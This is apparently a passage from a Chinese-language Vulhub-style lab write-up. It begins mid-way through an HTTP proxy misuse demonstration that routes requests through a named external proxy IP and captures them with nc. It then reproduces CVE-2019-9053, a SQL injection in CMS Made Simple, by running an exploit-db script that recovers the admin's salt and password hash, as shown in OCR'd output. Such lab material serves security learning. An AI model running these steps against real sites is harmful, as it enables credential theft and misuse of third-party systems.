<font style="color:#1f2328;background-color:#FFFFFF;">附带</font><font style="color:#1f2328;">Proxy: http://58.246.58.150:9002/</font><font style="color:#1f2328;background-color:#FFFFFF;">头，再次访问</font><font style="color:#1f2328;">http://your-ip:8080/index.php</font><font style="color:#1f2328;background-color:#FFFFFF;">：</font>

<!-- 这是一张图片，ocr 内容为：REQUEST RESPONSE IN PRETTY PRETTY RAW RENDER ACTIONS RAW ACTIONS GET /INDEX.PHP HTTP/1.1 HTTP/1.1  200  OK 1H 2 HOST:192.168.254.135;8080 2 SERVER:NGINX/1.27.0 USER-AQENT: MOZILLA/5.0 (X11; LINUX X86 64; RV:109.0) GECKO/201001001 3USE 3 DATE:WED, 26 JUN  2024 14:32:41 GMT CONTENT-TYPE:APPLICATION/JSON; CHARSET-UTF-8 FIREFOX/115.0 CONNECTION:CLOSE ACCEPT: 6X-POWERED-BY:PHP/5.6.23 LTEXT/HTML,APPLICATION/XHTML+XML,APPLICATION/XMLIQ-0.9,IMAGE/AVIF,IMAGE/WE 7CO CONTENT-LENGTH:299 BP,*/*;Q-0.8 89 ACCEPT-LANGUAGE:EN-US,EN;Q.5 ACCEPT-ENCODING:GZIP,DEFLATE "ARAS":{ 10 CONNECTION:CLOSE 子, PROXY:HTTP://58.246.58.150:9002/ "HEADERS":{ UPGRADE-INSECURE-REQUESTS:1 "HOST":"HTTPBIN.ORG", 10 11 "PROXY-CONNECTION":"KEEP-ALIVE", "USER-AGENT":"GUZZLEHTTP/6.2.0 CURL/7.38.0 PHP/5.6.23", 14 15 "X-AMZN-TRACE-ID":"ROOT-1-667C2688-71D759CE4CCF5A5C58D09483" 16 17 "ORIGIN":"58.246.58.150", 18 URL : HTTP://HTTPB1N.ORG/GET 19] -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822437775-debf8141-d970-45d1-a7cb-b7ff77aa168d.png)

<font style="color:#1f2328;background-color:#FFFFFF;">如上图，可见此时的</font><font style="color:#1f2328;background-color:#FFFFFF;">Origin</font><font style="color:#1f2328;background-color:#FFFFFF;">已经变成</font><font style="color:#1f2328;background-color:#FFFFFF;">58.246.58.150:9002</font><font style="color:#1f2328;background-color:#FFFFFF;">，也就是说真正进行</font><font style="color:#1f2328;background-color:#FFFFFF;">HTTP</font><font style="color:#1f2328;background-color:#FFFFFF;">访问的服务器是</font><font style="color:#1f2328;background-color:#FFFFFF;">58.246.58.150:9002</font><font style="color:#1f2328;background-color:#FFFFFF;">，也就是说</font><font style="color:#1f2328;background-color:#FFFFFF;">58.246.58.150:9002</font><font style="color:#1f2328;background-color:#FFFFFF;">已经将正常的</font><font style="color:#1f2328;background-color:#FFFFFF;">HTTP</font><font style="color:#1f2328;background-color:#FFFFFF;">请求代理了。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">在</font><font style="color:#1f2328;">*.*.122.65</font><font style="color:#1f2328;background-color:#FFFFFF;">上使用</font><font style="color:#1f2328;background-color:#FFFFFF;">NC</font><font style="color:#1f2328;background-color:#FFFFFF;">，就可以捕获当前请求的数据包，其中可能包含敏感数据：</font>

<!-- 这是一张图片，ocr 内容为：-122-65 IN /TMP/TORNADO-! [6:10:12] C:1 ROOT ON GIT:MASTER PROXY  NC -1 -P 888 GET HTTP://HTTPBIN.ORG/GET HTTP/1.1 PROXY-CONNECTION: KEEP-ALIVE USER-AGENT: GUZZLEHTTP/6.2.0 CUR1/7.38.0 PHP/5.6.23 HOST:HTTPBIN.ORG -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822437576-67ce8b8d-1ccc-42b1-8767-45132ba91664.png)

# <font style="color:#1f2328;background-color:#FFFFFF;">CMS Made Simple (CMSMS) < 2.2.10 </font><font style="color:#1f2328;background-color:#FFFFFF;">前台</font><font style="color:#1f2328;background-color:#FFFFFF;">SQL</font><font style="color:#1f2328;background-color:#FFFFFF;">注入漏洞（</font><font style="color:#1f2328;background-color:#FFFFFF;">CVE-2019-9053</font><font style="color:#1f2328;background-color:#FFFFFF;">）</font>
## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞环境</font>
<font style="color:#1f2328;background-color:#FFFFFF;">执行如下命令启动一个</font><font style="color:#1f2328;background-color:#FFFFFF;">CMS Made Simple 2.2.9.1</font><font style="color:#1f2328;background-color:#FFFFFF;">服务器：</font>

```plain
docker compose up -d
```

<font style="color:#1f2328;background-color:#FFFFFF;">环境启动后，你需要访问</font><font style="color:#1f2328;">http://your-ip/install.php</font><font style="color:#1f2328;background-color:#FFFFFF;">并安装</font><font style="color:#1f2328;background-color:#FFFFFF;">CMS</font><font style="color:#1f2328;background-color:#FFFFFF;">服务。</font>

<font style="color:#1f2328;background-color:#FFFFFF;">安装过程请根据页面中的安装向导来进行，其中</font><font style="color:#1f2328;background-color:#FFFFFF;">MySQL</font><font style="color:#1f2328;background-color:#FFFFFF;">数据库的地址是</font><font style="color:#1f2328;">db</font><font style="color:#1f2328;background-color:#FFFFFF;">，数据库名是</font><font style="color:#1f2328;">cmsms</font><font style="color:#1f2328;background-color:#FFFFFF;">，账号和密码均为</font><font style="color:#1f2328;">root</font><font style="color:#1f2328;background-color:#FFFFFF;">。</font>

<!-- 这是一张图片，ocr 内容为：192.168.254.135/INSTALL.PHP/INDEX.PHP KALI LINUXKALI TRAINING EXPLOIT-DB MSFU KALI DOCS KALI TOOLS OFFENSIVE SECURITY KALI FORUMS NETHUNTER OTHER BOOKMARKS MADE SIMPLE GMS INSTALLATION AND UPGRADE ASSISTANT 1.WELCOME WELCOME TO CMS MADE SIMPLE TM 2.9.1 (BLOW ME DOWN) START THE INSTALLATION OR UPGRADE PROCESS INSTALLATION AND UPGRADE ASSISTANT 2.DETECT EXISTING SOFTWARE ANALYZE DESTINATION DIRECTORY TO FIND EXISTING SOFTWARE INSTALLATIONDIRECTORY: 3.COMPATIBILITY TESTS /VAR/WWW/HTML CHECK TO MAKE SURE EVERYTHING IS OK TO INSTALL THE CMSMS CORE WELCOME! THIS IS THE CMS MADE SIMPLE AUTOMATIC INSTALLATION MECHANISM. THIS PACKAGE WILL ALL ALL ALL  4.CONFIGURATION INFO FOR NEW INSTALLS,AND FRESHEN OPERATION,ENTER YOU TO QUICKLY AND EASILY CONFIRM THAT YOUR WEB HOST IS COMPATIBLE WITH CMSMSMS AND TO INSTALL OR BASIC CONFIGURATION INFO UPGRADE TO THE LATEST VERSION OF CMS MADE SIMPLE. WE KNOW THAT YOU WILL ENJOY IT. 5.ADMIN ACCOUNT LNFO FOR NEW INSTALLS,ENTER ADMIN ACCOUNT INFO SELECT LANGUAGE 6.SITE SETTINGS FOR NEW INSTALLS ENTER SOME BASIC SITE DETAILS THE FRST THING WE WILL ASK YOU TO DO IS TO SELECT YOUR PREFERRED LANGUAGE FROM THE IST BELOW. THE USE ENHANCE YOUR EXPERIENCE DURING THIS INSTALATION SEQUENCE, BUT WILL NOT AFFECT YOUR CMS INSTALLATION 7.FILES EXTRACT FILES AVAILABLE LANGUAGES: ENGLISH 8.DATABASE WORK -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822486614-9ceccaf5-553e-4515-b060-d8fcde89be4e.png)

<!-- 这是一张图片，ocr 内容为：192.168.254.135/INSTALL.PHP/INDEX.PHP?MB5FCE6F14 EXPLOIT-DB KALI TRAINING KALI FORUMS KALI TOOLS MSFU OFFENSIVE SECURITY KALI DOCS NETHUNTER OTHER BOOKMARKS KALI LINUX STEP 4 - BASIC CONFIGURATION INFORMATION 2.DETECT EXISTING SOFTWARE ANALYZE DESTINATION DIRECTORY TO FIND EXISTING SOFTWARE INSTALLATION DIRECTORY: 3.COMPATIBILITYTESTS /YAR/WWW/HTML CHECK TO MAKE SURE EVERYTHING IS OK TO INSTALL THE CMSMS CORE DATABASE INFORMATION 4.CONFIGURATION INFO FOR NEW INSTALLS,AND FRESHEN OPERATION,ENTER BASIC CONFIGURATION INFO CMS MADE SIMPLE STORES A GREAT DEAL OF DALA IN THE DATABASE.A DATABASE CONNECTION IS MANDATORY. ADDITIONALLY,THE USER CREDENTIALS YOU SUPPLY SHOULD HAVE ALL PRIVILEGES ON THE 5.ADMIN ACCOUNT LNFO FOR NEW INSTALLS,ENTER ADMIN ACCOUNT INFO SPECIFIED DATABASE TO ALLOW CREATING. DROPPING AND MODIFYING TABLES, INDEXES AND VIEWS. 6.SITE SETTINGS FOR NEW INSTALLS ENTER SOME BASIC SITE DETAILS DATABASE HOSTNAME DB 7.FILES DATABASE NAME CMSMS EXTRACT FILES USER NAME 8.DATABASE WORK ROOT CREATE OR UPDATE THE DATABASE SCHEMA,SET INITIAL EVENTS,PERMISSIONS,USER ACCOUNTS, TEMPLATES, PASSWORD STYLESHEETS AND CONTENT 9.FINISH SERVER TIMEZONE INSTALL ANDLOR UPGRADE MODULES AS NECESSARY. WRITE THE CONLIG FILE,AND CLEAN UP. THE TIME ZONE INFORMATION IS NEEDED FOR TIME CALCULATIONS AND TIMELDATE DISPLAYS. PLEASE SELECT THE SERVER TIMEZONE UTC -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822486553-f7193bb9-5d8b-4136-810e-b365ce4ae925.png)

<!-- 这是一张图片，ocr 内容为：CREATING A NEW CMSMS 2.2.9.1 WEBSITE ACCOUNT INFORMATION STEP 5-ADMIN INSTALLATION DIRECTORY: /YAR/WWW/HTML PLEASE PROVIDE CREDENTIALS FOR THE INITIAL ADMINISTRATOR ACCOUNT. THIS ACCOUNT WIL HAVE ACCESS TO ALL OF THE FUNCTIONALITY OF THE CMSMS ADMIN CONSOLE. USER NAME ADMIN EMAIL ADDRESS 123456@MAIL.COM PASSWORD 00000000 REPEAT PASSWORD 00000000 NEXT- -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822486454-bc5f7d9e-79ce-4b41-981c-a545b15afdaa.png)<!-- 这是一张图片，ocr 内容为：STEP 6-SITE SETTINGS INSTALLATION DIRECTORY: /VAR/WWW/HTML WEB SITE NAME THE WEBSITE NAME IS USED IN DEFAULT TEMPLATES AS PART OF THE TITLE. PLEASE ENTER A HUMAN REA NAME FOR THE WEBSITE TEST.COM ADDITIONAL LANGUAGES SELECT LANGUAGES (IN ADDITION TO ENGLISH) TO INSTALL. NOTE: NOT ALL TRANSLATIONS ARE COMPLETE. AFRIKAANS AWN 5BNRAPCKN CATALA CESKY DANSK DEUTSCH EAANVLKA WELSH NEXT -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822486451-ed5c37a0-e108-47ec-885a-5993a405db0a.png)

## <font style="color:#1f2328;background-color:#FFFFFF;">漏洞复现</font>
<font style="color:#1f2328;background-color:#FFFFFF;">使用</font>[https://www.exploit-db.com/exploits/46635](https://www.exploit-db.com/exploits/46635#tdsub)<font style="color:#1f2328;background-color:#FFFFFF;">中的脚本来利用SQL注入漏洞：</font>

```plain
python2 poc.py -u http://127.0.0.1
```

<!-- 这是一张图片，ocr 内容为：(KALIGKALI)-[~/DESKTOP/VULHUB-MASTER/CMSMS/CVE-2019-9053] PYTHON2 POC.PY -U HTTP://192.168.254.135 -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822486450-7fb71ca5-3858-4b5f-ae97-5cfe5bfe7002.png)

<font style="color:#1f2328;background-color:#FFFFFF;">可见，管理员密码已经被该脚本获取。</font>

<!-- 这是一张图片，ocr 内容为：SALT FOR PASSWORD FOUND: 6020CBD92AB12C99 USERNAME FOUND:ADMIN EMAIL FOUND: 123456@MAIL.COM D FOUND: 6F48B04FAFCDAFCE88C7B25026A73E32 PASSWORD  F -->
![](https://cdn.nlark.com/yuque/0/2026/png/61811198/1780822487282-ec5073b3-5d66-4ce9-b208-e8886aee109b.png)



